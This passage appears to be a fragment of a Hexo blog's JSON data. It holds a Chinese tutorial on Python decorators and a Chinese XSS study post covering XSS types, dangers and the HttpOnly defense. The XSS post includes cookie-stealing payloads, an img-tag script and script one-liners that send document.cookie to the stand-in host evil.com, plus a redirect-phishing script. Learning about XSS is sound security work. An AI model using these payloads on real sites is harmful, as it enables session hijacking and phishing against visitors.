python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> functools</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">log</span><span class=\"params\">(text)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decorator</span><span class=\"params\">(func)</span>:</span></span><br><span class=\"line\"><span class=\"meta\">        @functools.wraps(func)</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wrapper</span><span class=\"params\">(*args, **kw)</span>:</span></span><br><span class=\"line\">            print(<span class=\"string\">'%s %s():'</span> % (text, func.__name__))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> func(*args, **kw)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> wrapper</span><br><span class=\"line\">    <span class=\"keyword\">return</span> decorator</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@log(\"execute\")</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">now</span><span class=\"params\">(tag)</span>:</span></span><br><span class=\"line\">    print(<span class=\"string\">'Execute Result : 2018-8-1  %s'</span>%tag)</span><br><span class=\"line\"></span><br><span class=\"line\">now(<span class=\"string\">'tag1'</span>)  <span class=\"comment\">#相当于执行了wapper('tag1')</span></span><br><span class=\"line\">print(now.__name__) <span class=\"comment\">#返回now,而不是wrapper。</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h3 id=\"装饰器\"><a href=\"#装饰器\" class=\"headerlink\" title=\"装饰器\"></a>装饰器</h3><h5 id=\"0x00-概述\"><a href=\"#0x00-概述\" class=\"headerlink\" title=\"0x00 概述\"></a>0x00 概述</h5><blockquote>\n<p>装饰器本质上是一个 Python 函数或类，它可以让其他函数或类在不需要做任何代码修改的前提下增加额外功能，装饰器的返回值也是一个函数/类对象。 </p>\n<p>它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景 。</p>\n<p>概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。 </p>\n</blockquote>","more":"<h5 id=\"0x01-简单装饰器\"><a href=\"#0x01-简单装饰器\" class=\"headerlink\" title=\"0x01 简单装饰器\"></a>0x01 简单装饰器</h5><ul>\n<li>执行装饰函数(log())，并将被装饰函数(now())作为一个参数传给装饰函数。然后将装饰函数执行的返回值赋值给被装饰函数名。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">log</span><span class=\"params\">(func)</span>:</span>  <span class=\"comment\">#装饰函数</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wrapper</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">        print(<span class=\"string\">'Execute Function: %s'</span> % func.__name__)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> func()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> wrapper</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@log  #等同于now = log(now)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">now</span><span class=\"params\">()</span>:</span>  <span class=\"comment\">#被装饰的函数</span></span><br><span class=\"line\">    print(<span class=\"string\">'Execute Result : 2018-8-1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">now()  <span class=\"comment\">#相当于执行了wapper()</span></span><br><span class=\"line\">print(now.__name__) <span class=\"comment\">#返回wrapper ，而不是now。因为执行了now = wrapper。</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"0x02-带参数的业务函数（被装饰函数）\"><a href=\"#0x02-带参数的业务函数（被装饰函数）\" class=\"headerlink\" title=\"0x02 带参数的业务函数（被装饰函数）\"></a>0x02 带参数的业务函数（被装饰函数）</h5><ul>\n<li>使用*args 和 **kwargs</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">log</span><span class=\"params\">(func)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wrapper</span><span class=\"params\">(*args, **kw)</span>:</span></span><br><span class=\"line\">        print(<span class=\"string\">'Execute Function: %s'</span> % func.__name__)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> func(*args, **kw)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> wrapper</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@log  #等同于now = log(now)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">now</span><span class=\"params\">(tag)</span>:</span></span><br><span class=\"line\">    print(<span class=\"string\">'Execute Result : 2018-8-1  %s'</span>%tag)</span><br><span class=\"line\"></span><br><span class=\"line\">now(<span class=\"string\">'tag1'</span>)  <span class=\"comment\">#相当于执行了wapper('tag1')</span></span><br><span class=\"line\">print(now.__name__) <span class=\"comment\">#返回wrapper ，而不是now。因为执行了now = wrapper。</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"0x03-装饰器进阶：带参数的装饰器\"><a href=\"#0x03-装饰器进阶：带参数的装饰器\" class=\"headerlink\" title=\"0x03 装饰器进阶：带参数的装饰器\"></a>0x03 装饰器进阶：带参数的装饰器</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">log</span><span class=\"params\">(text)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decorator</span><span class=\"params\">(func)</span>:</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wrapper</span><span class=\"params\">(*args, **kw)</span>:</span></span><br><span class=\"line\">            print(<span class=\"string\">'%s %s():'</span> % (text, func.__name__))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> func(*args, **kw)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> wrapper</span><br><span class=\"line\">    <span class=\"keyword\">return</span> decorator</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@log('execute')  #等同于now = log('execute')(now),先执行后传函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">now</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    print(<span class=\"string\">'2015-3-25'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">now()</span><br><span class=\"line\">print(now.__name__)  <span class=\"comment\">#返回wrapper ，而不是now。因为执行了now = wrapper。</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>先执行 log(‘execute’) ，返回decorator函数；之后再像普通装饰器一样，执行decorator(now)，返回wrapper函数，并将wrapper函数赋值给now变量。</p>\n</blockquote>\n<ul>\n<li>总结：<ul>\n<li>假设：log函数为装饰器函数，now函数为普通函数。<ul>\n<li>@log相当于 now=log(now)</li>\n<li>@log()相当于 now=log()(now)</li>\n<li>@log(“test”)相当于now=log(“test”)(now)</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"0x04-装饰器标准写法\"><a href=\"#0x04-装饰器标准写法\" class=\"headerlink\" title=\"0x04 装饰器标准写法\"></a>0x04 装饰器标准写法</h4><ul>\n<li>可以看到，前面的例子中，最后now函数的函数名（now.__name__）都变成了wrapper，这样可能会导致某些依靠判断函数名的语句出错。</li>\n<li>因此，可以通过导入functools模块，并使用@functools.wraps(func)解决，而不用使用语句：<code>now.__name__=func.__name__</code></li>\n<li>普通装饰器:</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> functools</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">log</span><span class=\"params\">(func)</span>:</span></span><br><span class=\"line\"><span class=\"meta\">    @functools.wraps(func)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wrapper</span><span class=\"params\">(*args, **kw)</span>:</span></span><br><span class=\"line\">        print(<span class=\"string\">'call %s():'</span> % func.__name__)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> func(*args, **kw)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> wrapper</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@log</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">now</span><span class=\"params\">(tag)</span>:</span></span><br><span class=\"line\">    print(<span class=\"string\">'Execute Result : 2018-8-1  %s'</span>%tag)</span><br><span class=\"line\"></span><br><span class=\"line\">now(<span class=\"string\">'tag1'</span>)  <span class=\"comment\">#相当于执行了wapper('tag1')</span></span><br><span class=\"line\">print(now.__name__) <span class=\"comment\">#返回now,而不是wrapper。</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>带参数的装饰器：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> functools</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">log</span><span class=\"params\">(text)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decorator</span><span class=\"params\">(func)</span>:</span></span><br><span class=\"line\"><span class=\"meta\">        @functools.wraps(func)</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wrapper</span><span class=\"params\">(*args, **kw)</span>:</span></span><br><span class=\"line\">            print(<span class=\"string\">'%s %s():'</span> % (text, func.__name__))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> func(*args, **kw)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> wrapper</span><br><span class=\"line\">    <span class=\"keyword\">return</span> decorator</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@log(\"execute\")</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">now</span><span class=\"params\">(tag)</span>:</span></span><br><span class=\"line\">    print(<span class=\"string\">'Execute Result : 2018-8-1  %s'</span>%tag)</span><br><span class=\"line\"></span><br><span class=\"line\">now(<span class=\"string\">'tag1'</span>)  <span class=\"comment\">#相当于执行了wapper('tag1')</span></span><br><span class=\"line\">print(now.__name__) <span class=\"comment\">#返回now,而不是wrapper。</span></span><br></pre></td></tr></table></figure>"},{"title":"XSS学习系列Chapter 2：漏洞原理","date":"2019-03-11T01:42:09.000Z","_content":"\n## 一、概述\n\n### 0x00 什么是XSS漏洞？\n\n> XSS，即跨站脚本（Cross Site Script），是由于网站对用户输入过滤不严而造成的漏洞。攻击者可以通过提交恶意JS代码，把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码导致被攻击。\n\n<!-- more -->\n\n### 0x01 XSS分类\n\n**1.反射型XSS**\n\n> 只是简单地把用户输入的数据”反射”给浏览器，攻击时需要诱骗用户点击恶意链接，也叫”非持久型XSS”。\n\n**2.存储型XSS**\n\n> 会把用户输入的数据”存储”在服务器端，也叫”持久性XSS”。常见于留言板、博客文章等可以提交并展示用户输入内容的功能点。\n\n**3.DOM XSS**\n\n> DOM XSS是由于前端的JS操作DOM时存在漏洞。\n>\n> 与前两种的主要区别在于，DOM XSS是不与服务端交互的，触发XSS靠的只是客户端DOM解析，DOM XSS是在浏览器的解析中改变页面DOM树，且恶意代码并不在返回页面源码中回显。\n\n### 0x02 XSS特点\n\n1. 是一种攻击客户端的漏洞，而不是攻击服务器的漏洞。\n2. 反射型XSS与存储型XSS都先与服务器交互后返回，DOM XSS是不需要服务器参与的。\n\n### 0x03 XSS危害\n\n> 理论上，只要是JavaScript脚本能做的功能，XSS Payload都能做到。\n\n- 窃取Cookie\n- 钓鱼攻击\n- 网页篡改、挂马\n- DoS攻击\n- XSS传播蠕虫\n- 发起指定的GET/POST请求\n- 结合CSRF漏洞进行攻击\n- ......\n\n## 二、XSS漏洞利用\n\n### 0x00 窃取Cookie\n\n**1.前瞻知识**\n\n- `document.cookie`可以获取到当前用户在当前网站的Cookie值。\n- `escape()`函数用于构建合理的URL（对给定的URL进行URL编码使其符合规定）。\n\n**2.漏洞利用脚本：**\n\n```javascript\nvar img = document.createElement('img'); \nimg.src='http://www.evil.com/no.php?'+escape(document.cookie);\ndocument.body.appendChild(img);\n```\n\n脚本原理：创建一个用于请求图片的`<img>`标签，该标签会向`src`属性指定的URL发起一次GET请求，我们让其`src`向我们的服务器发起一次GET并且让其携带Cookie作为参数。若脚本被加载并执行成功，我们通过查看我们的服务器`access.log`日志就能看到Cookie。也可以编写一个页面来接收Payload发送的Cookie参数。\n\n**3.其他漏洞利用代码：**\n\n- `<img src=\"http://www.evil.com?cookie='+document.cookie\"></img>`\n- `<script>new Image().src=\"http://www.evil.com?cookie=\"+document.cookie;</script>`\n\n**4.窃取其他信息**\n\n- `navigator.userAgent`读取客户端UA。\n\n**5.防御**\n\n在Set-Cookie时设置Http-Only标识，设置后将不允许JavaScript读取Cookie。\n\n### 0x01 钓鱼攻击\n\n**1.重定向钓鱼**\n\n> `<script>document.location.href=\"http://www.evil.com\"</script>`\n\n**2.iframe**\n\n通过JavaScript来添加一个新的`<iframe>`标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。\n\n### 0x02 其他利用\n\n参考链接：\n\nhttp://wps2015.org/2016/12/12/usually-used-xss-code/\n\nhttps://bbs.ichunqiu.com/thread-25578-1-1.html?from=sec\n\n## 三、XSS Check Cheatsheet\n\nhttp://momomoxiaoxi.com/2017/10/10/XSS/\n\nhttps://github.com/s0md3v/AwesomeXSS","source":"_posts/0x01-XSS学习系列之漏洞原理.md","raw":"---\ntitle: XSS学习系列Chapter 2：漏洞原理\ndate: 2019-03-11 09:42:09\ntags: \n\t- XSS\ncategories: WEB漏洞学习\n---\n\n## 一、概述\n\n### 0x00 什么是XSS漏洞？\n\n> XSS，即跨站脚本（Cross Site Script），是由于网站对用户输入过滤不严而造成的漏洞。攻击者可以通过提交恶意JS代码，把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码导致被攻击。\n\n<!-- more -->\n\n### 0x01 XSS分类\n\n**1.反射型XSS**\n\n> 只是简单地把用户输入的数据”反射”给浏览器，攻击时需要诱骗用户点击恶意链接，也叫”非持久型XSS”。\n\n**2.存储型XSS**\n\n> 会把用户输入的数据”存储”在服务器端，也叫”持久性XSS”。常见于留言板、博客文章等可以提交并展示用户输入内容的功能点。\n\n**3.DOM XSS**\n\n> DOM XSS是由于前端的JS操作DOM时存在漏洞。\n>\n> 与前两种的主要区别在于，DOM XSS是不与服务端交互的，触发XSS靠的只是客户端DOM解析，DOM XSS是在浏览器的解析中改变页面DOM树，且恶意代码并不在返回页面源码中回显。\n\n### 0x02 XSS特点\n\n1. 是一种攻击客户端的漏洞，而不是攻击服务器的漏洞。\n2. 反射型XSS与存储型XSS都先与服务器交互后返回，DOM XSS是不需要服务器参与的。\n\n### 0x03 XSS危害\n\n> 理论上，只要是JavaScript脚本能做的功能，XSS Payload都能做到。\n\n- 窃取Cookie\n- 钓鱼攻击\n- 网页篡改、挂马\n- DoS攻击\n- XSS传播蠕虫\n- 发起指定的GET/POST请求\n- 结合CSRF漏洞进行攻击\n- ......\n\n## 二、XSS漏洞利用\n\n### 0x00 窃取Cookie\n\n**1.前瞻知识**\n\n- `document.cookie`可以获取到当前用户在当前网站的Cookie值。\n- `escape()`函数用于构建合理的URL（对给定的URL进行URL编码使其符合规定）。\n\n**2.漏洞利用脚本：**\n\n```javascript\nvar img = document.createElement('img'); \nimg.src='http://www.evil.com/no.php?'+escape(document.cookie);\ndocument.body.appendChild(img);\n```\n\n脚本原理：创建一个用于请求图片的`<img>`标签，该标签会向`src`属性指定的URL发起一次GET请求，我们让其`src`向我们的服务器发起一次GET并且让其携带Cookie作为参数。若脚本被加载并执行成功，我们通过查看我们的服务器`access.log`日志就能看到Cookie。也可以编写一个页面来接收Payload发送的Cookie参数。\n\n**3.其他漏洞利用代码：**\n\n- `<img src=\"http://www.evil.com?cookie='+document.cookie\"></img>`\n- `<script>new Image().src=\"http://www.evil.com?cookie=\"+document.cookie;</script>`\n\n**4.窃取其他信息**\n\n- `navigator.userAgent`读取客户端UA。\n\n**5.防御**\n\n在Set-Cookie时设置Http-Only标识，设置后将不允许JavaScript读取Cookie。\n\n### 0x01 钓鱼攻击\n\n**1.重定向钓鱼**\n\n> `<script>document.location.href=\"http://www.evil.com\"</script>`\n\n**2.iframe**\n\n通过JavaScript来添加一个新的`<iframe>`标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。\n\n### 0x02 其他利用\n\n参考链接：\n\nhttp://wps2015.org/2016/12/12/usually-used-xss-code/\n\nhttps://bbs.ichunqiu.com/thread-25578-1-1.html?from=sec\n\n## 三、XSS Check Cheatsheet\n\nhttp://momomoxiaoxi.com/2017/10/10/XSS/\n\nhttps://github.com/s0md3v/AwesomeXSS","slug":"0x01-XSS学习系列之漏洞原理","published":1,"updated":"2019-03-22T03:47:35.074Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83kg001l7or0st722bpp","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><h3 id=\"0x00-什么是XSS漏洞？\"><a href=\"#0x00-什么是XSS漏洞？\" class=\"headerlink\" title=\"0x00 什么是XSS漏洞？\"></a>0x00 什么是XSS漏洞？</h3><blockquote>\n<p>XSS，即跨站脚本（Cross Site Script），是由于网站对用户输入过滤不严而造成的漏洞。攻击者可以通过提交恶意JS代码，把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码导致被攻击。</p>\n</blockquote>\n<a id=\"more\"></a>\n<h3 id=\"0x01-XSS分类\"><a href=\"#0x01-XSS分类\" class=\"headerlink\" title=\"0x01 XSS分类\"></a>0x01 XSS分类</h3><p><strong>1.反射型XSS</strong></p>\n<blockquote>\n<p>只是简单地把用户输入的数据”反射”给浏览器，攻击时需要诱骗用户点击恶意链接，也叫”非持久型XSS”。</p>\n</blockquote>\n<p><strong>2.存储型XSS</strong></p>\n<blockquote>\n<p>会把用户输入的数据”存储”在服务器端，也叫”持久性XSS”。常见于留言板、博客文章等可以提交并展示用户输入内容的功能点。</p>\n</blockquote>\n<p><strong>3.DOM XSS</strong></p>\n<blockquote>\n<p>DOM XSS是由于前端的JS操作DOM时存在漏洞。</p>\n<p>与前两种的主要区别在于，DOM XSS是不与服务端交互的，触发XSS靠的只是客户端DOM解析，DOM XSS是在浏览器的解析中改变页面DOM树，且恶意代码并不在返回页面源码中回显。</p>\n</blockquote>\n<h3 id=\"0x02-XSS特点\"><a href=\"#0x02-XSS特点\" class=\"headerlink\" title=\"0x02 XSS特点\"></a>0x02 XSS特点</h3><ol>\n<li>是一种攻击客户端的漏洞，而不是攻击服务器的漏洞。</li>\n<li>反射型XSS与存储型XSS都先与服务器交互后返回，DOM XSS是不需要服务器参与的。</li>\n</ol>\n<h3 id=\"0x03-XSS危害\"><a href=\"#0x03-XSS危害\" class=\"headerlink\" title=\"0x03 XSS危害\"></a>0x03 XSS危害</h3><blockquote>\n<p>理论上，只要是JavaScript脚本能做的功能，XSS Payload都能做到。</p>\n</blockquote>\n<ul>\n<li>窃取Cookie</li>\n<li>钓鱼攻击</li>\n<li>网页篡改、挂马</li>\n<li>DoS攻击</li>\n<li>XSS传播蠕虫</li>\n<li>发起指定的GET/POST请求</li>\n<li>结合CSRF漏洞进行攻击</li>\n<li>……</li>\n</ul>\n<h2 id=\"二、XSS漏洞利用\"><a href=\"#二、XSS漏洞利用\" class=\"headerlink\" title=\"二、XSS漏洞利用\"></a>二、XSS漏洞利用</h2><h3 id=\"0x00-窃取Cookie\"><a href=\"#0x00-窃取Cookie\" class=\"headerlink\" title=\"0x00 窃取Cookie\"></a>0x00 窃取Cookie</h3><p><strong>1.前瞻知识</strong></p>\n<ul>\n<li><code>document.cookie</code>可以获取到当前用户在当前网站的Cookie值。</li>\n<li><code>escape()</code>函数用于构建合理的URL（对给定的URL进行URL编码使其符合规定）。</li>\n</ul>\n<p><strong>2.漏洞利用脚本：</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'img'</span>); </span><br><span class=\"line\">img.src=<span class=\"string\">'http://www.evil.com/no.php?'</span>+<span class=\"built_in\">escape</span>(<span class=\"built_in\">document</span>.cookie);</span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>\n<p>脚本原理：创建一个用于请求图片的<code>&lt;img&gt;</code>标签，该标签会向<code>src</code>属性指定的URL发起一次GET请求，我们让其<code>src</code>向我们的服务器发起一次GET并且让其携带Cookie作为参数。若脚本被加载并执行成功，我们通过查看我们的服务器<code>access.log</code>日志就能看到Cookie。也可以编写一个页面来接收Payload发送的Cookie参数。</p>\n<p><strong>3.其他漏洞利用代码：</strong></p>\n<ul>\n<li><code>&lt;img src=&quot;http://www.evil.com?cookie=&#39;+document.cookie&quot;&gt;&lt;/img&gt;</code></li>\n<li><code>&lt;script&gt;new Image().src=&quot;http://www.evil.com?cookie=&quot;+document.cookie;&lt;/script&gt;</code></li>\n</ul>\n<p><strong>4.窃取其他信息</strong></p>\n<ul>\n<li><code>navigator.userAgent</code>读取客户端UA。</li>\n</ul>\n<p><strong>5.防御</strong></p>\n<p>在Set-Cookie时设置Http-Only标识，设置后将不允许JavaScript读取Cookie。</p>\n<h3 id=\"0x01-钓鱼攻击\"><a href=\"#0x01-钓鱼攻击\" class=\"headerlink\" title=\"0x01 钓鱼攻击\"></a>0x01 钓鱼攻击</h3><p><strong>1.重定向钓鱼</strong></p>\n<blockquote>\n<p><code>&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</code></p>\n</blockquote>\n<p><strong>2.iframe</strong></p>\n<p>通过JavaScript来添加一个新的<code>&lt;iframe&gt;</code>标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。</p>\n<h3 id=\"0x02-其他利用\"><a href=\"#0x02-其他利用\" class=\"headerlink\" title=\"0x02 其他利用\"></a>0x02 其他利用</h3><p>参考链接：</p>\n<p><a href=\"http://wps2015.org/2016/12/12/usually-used-xss-code/\" target=\"_blank\" rel=\"noopener\">http://wps2015.org/2016/12/12/usually-used-xss-code/</a></p>\n<p><a href=\"https://bbs.ichunqiu.com/thread-25578-1-1.html?from=sec\" target=\"_blank\" rel=\"noopener\">https://bbs.ichunqiu.com/thread-25578-1-1.html?from=sec</a></p>\n<h2 id=\"三、XSS-Check-Cheatsheet\"><a href=\"#三、XSS-Check-Cheatsheet\" class=\"headerlink\" title=\"三、XSS Check Cheatsheet\"></a>三、XSS Check Cheatsheet</h2><p><a href=\"http://momomoxiaoxi.com/2017/10/10/XSS/\" target=\"_blank\" rel=\"noopener\">http://momomoxiaoxi.com/2017/10/10/XSS/</a></p>\n<p><a href=\"https://github.com/s0md3v/AwesomeXSS\" target=\"_blank\" rel=\"noopener\">https://github.com/s0md3v/AwesomeXSS</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><h3 id=\"0x00-什么是XSS漏洞？\"><a href=\"#0x00-什么是XSS漏洞？\" class=\"headerlink\" title=\"0x00 什么是XSS漏洞？\"></a>0x00 什么是XSS漏洞？</h3><blockquote>\n<p>XSS，即跨站脚本（Cross Site Script），是由于网站对用户输入过滤不严而造成的漏洞。攻击者可以通过提交恶意JS代码，把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码导致被攻击。</p>\n</blockquote>","more":"<h3 id=\"0x01-XSS分类\"><a href=\"#0x01-XSS分类\" class=\"headerlink\" title=\"0x01 XSS分类\"></a>0x01 XSS分类</h3><p><strong>1.反射型XSS</strong></p>\n<blockquote>\n<p>只是简单地把用户输入的数据”反射”给浏览器，攻击时需要诱骗用户点击恶意链接，也叫”非持久型XSS”。</p>\n</blockquote>\n<p><strong>2.存储型XSS</strong></p>\n<blockquote>\n<p>会把用户输入的数据”存储”在服务器端，也叫”持久性XSS”。常见于留言板、博客文章等可以提交并展示用户输入内容的功能点。</p>\n</blockquote>\n<p><strong>3.DOM XSS</strong></p>\n<blockquote>\n<p>DOM XSS是由于前端的JS操作DOM时存在漏洞。</p>\n<p>与前两种的主要区别在于，DOM XSS是不与服务端交互的，触发XSS靠的只是客户端DOM解析，DOM XSS是在浏览器的解析中改变页面DOM树，且恶意代码并不在返回页面源码中回显。</p>\n</blockquote>\n<h3 id=\"0x02-XSS特点\"><a href=\"#0x02-XSS特点\" class=\"headerlink\" title=\"0x02 XSS特点\"></a>0x02 XSS特点</h3><ol>\n<li>是一种攻击客户端的漏洞，而不是攻击服务器的漏洞。</li>\n<li>反射型XSS与存储型XSS都先与服务器交互后返回，DOM XSS是不需要服务器参与的。</li>\n</ol>\n<h3 id=\"0x03-XSS危害\"><a href=\"#0x03-XSS危害\" class=\"headerlink\" title=\"0x03 XSS危害\"></a>0x03 XSS危害</h3><blockquote>\n<p>理论上，只要是JavaScript脚本能做的功能，XSS Payload都能做到。</p>\n</blockquote>\n<ul>\n<li>窃取Cookie</li>\n<li>钓鱼攻击</li>\n<li>网页篡改、挂马</li>\n<li>DoS攻击</li>\n<li>XSS传播蠕虫</li>\n<li>发起指定的GET/POST请求</li>\n<li>结合CSRF漏洞进行攻击</li>\n<li>……</li>\n</ul>\n<h2 id=\"二、XSS漏洞利用\"><a href=\"#二、XSS漏洞利用\" class=\"headerlink\" title=\"二、XSS漏洞利用\"></a>二、XSS漏洞利用</h2><h3 id=\"0x00-窃取Cookie\"><a href=\"#0x00-窃取Cookie\" class=\"headerlink\" title=\"0x00 窃取Cookie\"></a>0x00 窃取Cookie</h3><p><strong>1.前瞻知识</strong></p>\n<ul>\n<li><code>document.cookie</code>可以获取到当前用户在当前网站的Cookie值。</li>\n<li><code>escape()</code>函数用于构建合理的URL（对给定的URL进行URL编码使其符合规定）。</li>\n</ul>\n<p><strong>2.漏洞利用脚本：</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 